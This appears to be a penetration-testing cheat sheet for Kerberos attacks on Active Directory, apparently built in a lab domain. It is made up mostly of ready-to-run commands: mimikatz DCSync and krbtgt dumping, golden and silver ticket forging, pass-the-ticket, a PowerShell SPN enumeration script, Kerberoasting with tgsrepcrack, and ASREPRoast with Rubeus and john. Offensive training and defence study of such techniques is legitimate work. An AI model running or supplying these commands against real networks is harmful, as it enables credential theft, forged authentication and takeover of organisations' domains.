# Kerberos Attack

***

## DCSync

DCSync is a mimikatz feature that enables us to act as a Domain Controller and request password data from the targeted DC  

```
lsadump::dcsync /domain:nooranetshield.local /user:administrator
```

```
Kerberos::golden /user:user1 /domain:nooranet.cy /sid:S-1-5-21-1297822710-3352181213-1265919107-1114 /target:nooranet.cy /service:HTTP /aes128:23b740c1bc0770cbefb5b612da1f5735  /ptt
```

```
kerberos::ptt ticket.kirbi
misc::cmd
```

## Kerberoasting

Once we have a list of Service Principal Names (SPNs) associated with service accounts, these SPNs can be used to request Kerberos TGS service tickets.
What we can do with those tickets is try to crack them offline. This credential extracting procedure against service accounts is known as kerberoasting.
Kerberoasting can be performed by a regular user without sending any suspicious traffic to the target system. This attack is usually effective due to weak domain password policies. Most service account passwords are the same length as the domain password minimum

setspn -A MSSQLSvc/ht.nooranetshield.local:1433 nooranetshield\user1

* Obtain a list of SPN values for user accounts
  Spn.ps1
  
  ```powershell
  # Build LDAP Filter to look for users with SPN values registered for current domain
  $ldapFilter = "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"
  $domain = New-Object System.DirectoryServices.DirectoryEntry
  $search = New-Object System.DirectoryServices.DirectorySearcher
  $search.SearchRoot = $domain
  $search.PageSize = 1000
  $search.Filter = $ldapFilter
  $search.SearchScope = "Subtree"
  #Execute Search
  $results = $search.FindAll()
  #Display SPN values from the returned objects
  foreach ($result in $results)
  {
      $userEntry = $result.GetDirectoryEntry()
      Write-Host "User Name = " $userEntry.name
      foreach ($SPN in $userEntry.servicePrincipalName)
      {
          Write-Host "SPN = " $SPN
      }
      Write-Host ""
  }
  ```

* Request Service Tickets for service account SPNs
  
  ```
  Add-Type -AssemblyName System.IdentityModel
  New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList  'MSSQLSvc/ht.nooranetshield.local:1433'
  ```

* Extract Service Tickets Using Mimikatz
  
  ```
  mimikatz # kerberos::list /export
  ```

* Crack the Tickets
  
  ```
  E:\AD-Attack\kerberoast>python tgsrepcrack.py wordlist.txt "2-40a10000-user1@MSSQLSvc~ht.nooranetshield.local~1433-NOORANETSHIELD.LOCAL.kirbi"
  ```

## Silver Ticket

Silver Tickets enable an attacker to create forged service tickets (TGS tickets). These tickets can provide access to the service that was compromised with a Kerberoasting attack

#### Create Forged Service Tickets Using Mimikatz

```
kerberos::golden /sid:S-1-5-21-1607521056-20504773-1893184097 /domain:nooranetshield.local  /target:app.nooranetshield.local:1433 /service:MSSQLSvc /rc4:47bf8039a8506cd67c524a03ff84ba4e /user:redteam1 /id:1104 /ptt
```

* Domain sid 
  * Whoami /user
    * nooranetshield\user1 S-1-5-21-1607521056-20504773-1893184097-1104
* Target – This is the host, which can be copied from the SPN value. In my case, this is app.nooranetshield.local:1433.
* Service – This will be the name of the service that we will create tickets for. This must be a service running as the service account we compromised. We will focus on the MSSQLSvc.
* User – This specifies the user that the ticket will be created for, and this can be any user account whatsoever, even user accounts that do not exist.
* Groups – This is the list of groups that will be added to the PAC for the account. By default, this will include Domain Admins but you can override it with custom groups if needed.
* Rc4 : NTLM hash service password 
  * install-module -name DSInternals
  * Import-Module DSInternals
  * $pwd = ConvertTo-SecureString "Aa123456" -AsPlainText -Force
  * ConvertTo-NTHash $pwd
  * 47bf8039a8506cd67c524a03ff84ba4e

##### Pass-the-Ticket

* Klist
* Sqlcmd -S app.nooranetshield.local 
  * Select db_name();
  * Go
  * Select @@version;
  * Go

## Golden Ticket

* Gather KRBTGT Password Information
  
  ```
  lsadump::dcsync /domain:nooranetshield.local /user:krbtgt
  Or
  privilege::debug
  lsadump::lsa /inject /name:krbtgt
  ```

* Create Golden Tickets
  
  ```
  kerberos::golden /sid:S-1-5-21-1607521056-20504773-1893184097 /domain:nooranetshield.local  /rc4:308e123a6c7a331a448003c5f79d8a0a /id:500 /user:trustme
  ```

* Pass the Ticket
  
  ```
  kerberos::ptt ticket.kirbi
  misc::cmd
  pushd \\ht.nooranetshield.local\c$
  ```
  
  ## ASREPRoast
  
  The ASREPRoast attack looks for users without Kerberos pre-authentication required attribute That means that anyone can send an AS_REQ request to the DC o\\n behalf of any of those users, and receive an AS_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline.
  
  ```powershell
  Get-DomainUser -PreauthNotRequired -verbose
  Rubeus.exe asreproast /format:hashcat /outfile:out.txt
  john --wordlist=passwords_kerb.txt  out.txt
  ```
